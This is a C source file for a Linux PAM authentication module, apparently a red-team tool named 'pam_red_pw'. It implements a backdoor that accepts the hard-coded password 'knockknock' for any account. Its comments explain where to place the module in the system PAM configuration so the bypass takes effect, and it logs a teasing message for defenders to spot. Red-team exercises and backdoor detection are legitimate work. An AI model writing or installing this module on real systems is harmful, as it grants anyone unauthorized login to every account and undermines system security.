#include<security/pam_modules.h> // For PAM stuff
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<syslog.h>


/**	Authenticate portion of module. When listed 'sufficient' in config file,
	 it will let anyone log in with the password defined below.
	*MUST* be placed after pam_unix, so that the password is present in the
	 token.
	Best placed in common-auth (system-auth), or whichever is the primary PAM
	 config.
**/
int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char *argv[]){
	setlogmask(LOG_UPTO(LOG_NOTICE));
	openlog("pam_red_pw", LOG_CONS | LOG_PID | LOG_NDELAY, LOG_LOCAL1);

	const char *pw;
	pam_get_item(pamh, PAM_AUTHTOK, (const void **) &pw);

	// Free-for-all password
	const char *best_pw = "knockknock";

	// Check if given password is the above, succeed if so
	if(!strcmp(best_pw, pw)){
		syslog(LOG_AUTHPRIV, "Red team used the secret password ;)"); // This is the hint for spotting this module

		closelog();
		return PAM_SUCCESS;
	}

	// Log when it fails (probably should not have)
	//syslog(LOG_AUTHPRIV, "This is not the secret password.");

	closelog();
	return PAM_AUTH_ERR;
}

int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char *argv[]){
	setlogmask(LOG_UPTO(LOG_DEBUG));

	openlog("pam_red_pw", LOG_CONS | LOG_PID | LOG_NDELAY, LOG_LOCAL1);

	syslog(LOG_DEBUG, "Set cred not implemented.");

	closelog();

	return PAM_SERVICE_ERR;
}

int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char *argv[]){
	setlogmask(LOG_UPTO(LOG_DEBUG));

	openlog("pam_red_pw", LOG_CONS | LOG_PID | LOG_NDELAY, LOG_LOCAL1);

	syslog(LOG_DEBUG, "Account management not implemented.");

	closelog();

	return PAM_SERVICE_ERR;
}

int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char *argv[]){
	setlogmask(LOG_UPTO(LOG_DEBUG));

	openlog("pam_red_pw", LOG_CONS | LOG_PID | LOG_NDELAY, LOG_LOCAL1);

	syslog(LOG_DEBUG, "Open session not implemented.");

	closelog();

	return PAM_SERVICE_ERR;
}

int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char *argv[]){
	setlogmask(LOG_UPTO(LOG_DEBUG));

	openlog("pam_red_pw", LOG_CONS | LOG_PID | LOG_NDELAY, LOG_LOCAL1);

	syslog(LOG_DEBUG, "Close session not implemented.");

	closelog();

	return PAM_SERVICE_ERR;
}

int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char *argv[]){
	setlogmask(LOG_UPTO(LOG_DEBUG));

	openlog("pam_red_pw", LOG_CONS | LOG_PID | LOG_NDELAY, LOG_LOCAL1);

	syslog(LOG_DEBUG, "Change auth not implemented.");

	closelog();

	return PAM_SERVICE_ERR;
}
